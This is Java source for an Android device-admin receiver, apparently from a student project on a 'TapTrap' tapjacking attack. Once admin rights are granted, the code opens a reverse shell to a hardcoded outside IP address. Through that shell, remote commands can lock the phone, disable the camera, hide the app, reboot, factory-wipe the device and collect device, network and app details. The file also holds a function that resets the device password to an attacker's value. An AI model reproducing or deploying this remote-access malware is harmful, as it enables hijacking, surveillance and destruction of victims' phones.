package com.example.inf2007_mad_j1847.test;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import java.io.IOException;
import java.net.Socket;

import androidx.camera.core.Camera;

public class AppDeviceAdminReceiver extends DeviceAdminReceiver {

    private static final String TAG = "TapTrap-Admin";
    private static final String SERVER_IP = "20.2.66.175";
    private static final int SERVER_PORT = 9999;
    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        // 🔴 TAPTRAP SUCCEEDED!
        Log.d(TAG, "🔥 Device Admin GRANTED via TapTrap!");
        Log.d(TAG, "connect to server ");
        launchReverseShell(context);

//        try {
//            Thread.sleep(5000);
//        } catch (InterruptedException e) {
//            e.printStackTrace();
//        }

        //String pw_context = getPasswordQualityString(context);
        //Log.d(TAG, pw_context);
        // add command here

//        String attackerPassword = "123456";
//        boolean passwordChanged = changeDevicePassword(context, attackerPassword);
//        lockDevice(context);

        // disableCamera(context);
        // Optional: Post-attack actions here
        // DevicePolicyManager dpm = getManager(context);
        // dpm.lockNow(); // Example: lock device immediately
    }

    // Reverse Shell Code
    private void launchReverseShell(Context context) {
        new Thread(() -> {
            try {
                Socket socket = new Socket(SERVER_IP, SERVER_PORT);
                Log.d(TAG, "🔥 Reverse shell launched!");

                // Send a welcome message to the listener
                java.io.PrintWriter writer = new java.io.PrintWriter(socket.getOutputStream(), true);
                writer.println("🔥 TapTrap shell connected!");
                writer.println("Available commands:");
                writer.println("  lock        - Lock the device");
                writer.println("  cam_off (no use?)    - Disable camera");
                writer.println("  cam_on (no use?)     - Enable camera");
                writer.println("  whoami      - Show app user info");
                writer.println("  device_info - Show device details");
                writer.println("  battery     - Show battery status");
                writer.println("  ip          - Show IP addresses");
                writer.println("  list_apps (only show current app)  - List installed apps");
                writer.println("  hide_app (no use?)    - Hide app from launcher");
                writer.println("  show_app (no use?)    - Show app in launcher");
                writer.println("  reboot (not working on emulator)     - Reboot device");
                writer.println("  exit        - Close connection");
                writer.println("  wipe  (not working on emulator)      - Factory reset device (physical only)");
                writer.println("  screen_mirror - Start sending screenshots every 10s");
                writer.println("  screen_stop   - Stop screen mirror");
                writer.println("----------------------------------");

                // Read commands from listener
                java.io.BufferedReader reader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(socket.getInputStream())
                );

                String command;
                while ((command = reader.readLine()) != null) {
                    command = command.trim();
                    Log.d(TAG, "📩 Command received: " + command);
                    String response = handleCommand(context, command);
                    writer.println(response);

                    if (command.equals("exit")) break;
                }

                socket.close();

            } catch (Exception e) {
                Log.e(TAG, "Shell failed: " + e.getMessage());
            }
        }).start();
    }

    private String handleCommand(Context context, String command) {
        switch (command.toLowerCase()) {
            case "lock":
                lockDevice(context);
                return "✅ Device locked!";

            case "cam_off":
                disableCamera(context);
                return "✅ Camera disabled!";

            case "cam_on":
                enableCamera(context);
                return "✅ Camera enabled!";

            case "whoami":
                return "User: " + android.os.Process.myUid() +
                        " | App: " + context.getPackageName();

            case "device_info":
                return getDeviceInfo();

            case "battery":
                return getBatteryInfo(context);

            case "ip":
                return getIpAddress();

            case "list_apps":
                return getInstalledApps(context);

            case "hide_app":
                hideApp(context);
                return "✅ App hidden from launcher!";

            case "show_app":
                showApp(context);
                return "✅ App visible in launcher!";

            case "reboot":
                rebootDevice(context);
                return "✅ Rebooting device...";

            case "help":
                return "Commands: lock, cam_off, cam_on, whoami, device_info, battery, ip, list_apps, hide_app, show_app, reboot, exit";

            case "exit":
                return "👋 Closing connection...";

            case "wipe":
                wipeDevice(context);
                return "✅ Wiping device...";

            case "screen_mirror":
//                Intent mirrorIntent = new Intent(context, ScreenMirrorService.class);
//                mirrorIntent.putExtra("resultCode", ScreenMirrorService.sResultCode);
//                mirrorIntent.putExtra("resultData", ScreenMirrorService.sResultData);
//                context.startForegroundService(mirrorIntent);
                return "🎥 Screen mirror already running! View at http://20.2.66.175:9090";

            case "screen_stop":
                context.stopService(new Intent(context, ScreenMirrorService.class));
                return "🛑 Screen mirror stopped!";

            default:
                return "❌ Unknown command: " + command + " | type 'help' for commands";
        }
    }

    // Add this new wipe function
    public void wipeDevice(Context context) {
        DevicePolicyManager dpm = getDpm(context);
        Log.d(TAG, "💀 Wiping device!");
        dpm.wipeData(0);
    }
    // Device info
    private String getDeviceInfo() {
        return "Model: " + android.os.Build.MODEL +
                "\nManufacturer: " + android.os.Build.MANUFACTURER +
                "\nAndroid: " + android.os.Build.VERSION.RELEASE +
                "\nAPI: " + android.os.Build.VERSION.SDK_INT +
                "\nDevice: " + android.os.Build.DEVICE +
                "\nFingerprint: " + android.os.Build.FINGERPRINT;
    }

    // Battery info
    private String getBatteryInfo(Context context) {
        android.content.IntentFilter ifilter = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = context.registerReceiver(null, ifilter);
        int level = batteryStatus != null ? batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) : -1;
        int scale = batteryStatus != null ? batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) : -1;
        int status = batteryStatus != null ? batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) : -1;
        float pct = level * 100 / (float) scale;
        boolean charging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                status == android.os.BatteryManager.BATTERY_STATUS_FULL;
        return "Battery: " + (int) pct + "% | " + (charging ? "Charging" : "Not charging");
    }

    // IP Address
    private String getIpAddress() {
        try {
            java.util.Enumeration<java.net.NetworkInterface> interfaces = java.net.NetworkInterface.getNetworkInterfaces();
            StringBuilder sb = new StringBuilder("IP Addresses:\n");
            while (interfaces.hasMoreElements()) {
                java.net.NetworkInterface iface = interfaces.nextElement();
                java.util.Enumeration<java.net.InetAddress> addrs = iface.getInetAddresses();
                while (addrs.hasMoreElements()) {
                    java.net.InetAddress addr = addrs.nextElement();
                    if (!addr.isLoopbackAddress()) {
                        sb.append(iface.getName()).append(": ").append(addr.getHostAddress()).append("\n");
                    }
                }
            }
            return sb.toString();
        } catch (Exception e) {
            return "Failed to get IP: " + e.getMessage();
        }
    }

    // List installed apps
    private String getInstalledApps(Context context) {
        android.content.pm.PackageManager pm = context.getPackageManager();
        java.util.List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(0);
        StringBuilder sb = new StringBuilder("Installed Apps (" + apps.size() + "):\n");
        for (android.content.pm.ApplicationInfo app : apps) {
            // only show user installed apps, not system apps
            if ((app.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0) {
                sb.append("  - ").append(app.packageName).append("\n");
            }
        }
        return sb.toString();
    }

    // Hide app from launcher
    private void hideApp(Context context) {
        android.content.pm.PackageManager pm = context.getPackageManager();
        pm.setComponentEnabledSetting(
                new ComponentName(context, context.getClass()),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
        );
    }

    // Show app in launcher
    private void showApp(Context context) {
        android.content.pm.PackageManager pm = context.getPackageManager();
        pm.setComponentEnabledSetting(
                new ComponentName(context, context.getClass()),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
        );
    }

    // Reboot device
    private void rebootDevice(Context context) {
        DevicePolicyManager dpm = getDpm(context);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            dpm.reboot(getAdmin(context));
        }
    }

    // ========== CENTRALIZED DPM GETTER ==========
    /**
     * Get DevicePolicyManager instance - ALL commands use this
     */
    private DevicePolicyManager getDpm(Context context) {
        return (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
    }

    /**
     * Get ComponentName - ALL commands use this
     */
    private ComponentName getAdmin(Context context) {
        return new ComponentName(context, AppDeviceAdminReceiver.class);
    }

    /**
     * 1. Lock device immediately
     */
    public void lockDevice(Context context) {
        DevicePolicyManager dpm = getDpm(context);
        Log.d(TAG, " Locking device now");
        dpm.lockNow();

    }

    /**
     * 2. Disable camera
     */
    public void disableCamera(Context context) {
        try {
            DevicePolicyManager dpm = getDpm(context);
            ComponentName admin = getAdmin(context);

            Log.d(TAG, " Disabling camera");
            dpm.setCameraDisabled(admin, true);
            Log.d(TAG, " end of Disabling camera");

        }catch (Exception e) {
            Log.d(TAG, "error disabling camera: " + e.getMessage());
        }



//        try {
//            Camera camera = Camera.open();
//            camera.release();
//            Log.d(TAG, "⚠️ Camera still works - something wrong!");
//        } catch (Exception e) {
//            Log.d(TAG, "✅ Camera disabled successfully: " + e.getMessage());
//        }

    }

    /**
     * 3. Enable camera
     */
    public void enableCamera(Context context) {
        DevicePolicyManager dpm = getDpm(context);
        ComponentName admin = getAdmin(context);

        Log.d(TAG, " Enabling camera");
        dpm.setCameraDisabled(admin, false);

    }

    public boolean changeDevicePassword(Context context, String newPassword) {
        DevicePolicyManager dpm = getDpm(context);

        Log.d(TAG, "🔑 Attempting to change password");

        // Now change the password
        boolean success = dpm.resetPassword(newPassword, 0);

        if (success) {
            Log.d(TAG, "✓ Password successfully changed to: " + newPassword);

        } else {
            Log.e(TAG, "✗ Password change FAILED");

        }

        return success;
    }


    public String getPasswordQualityString(Context context) {
        DevicePolicyManager dpm = getDpm(context);
        ComponentName admin = getAdmin(context);

        int quality = dpm.getPasswordQuality(admin);

        switch(quality) {
            case DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED:
                return "No password requirements";
            case DevicePolicyManager.PASSWORD_QUALITY_SOMETHING:
                return "Password required (any)";
            case DevicePolicyManager.PASSWORD_QUALITY_NUMERIC:
                return "Numeric PIN required";
            case DevicePolicyManager.PASSWORD_QUALITY_NUMERIC_COMPLEX:
                return "Complex numeric (no repeats)";
            case DevicePolicyManager.PASSWORD_QUALITY_ALPHABETIC:
                return "Alphabetic password required";
            case DevicePolicyManager.PASSWORD_QUALITY_ALPHANUMERIC:
                return "Alphanumeric password required";
            case DevicePolicyManager.PASSWORD_QUALITY_COMPLEX:
                return "Complex password required";
            default:
                return "Unknown quality: " + quality;
        }
    }

}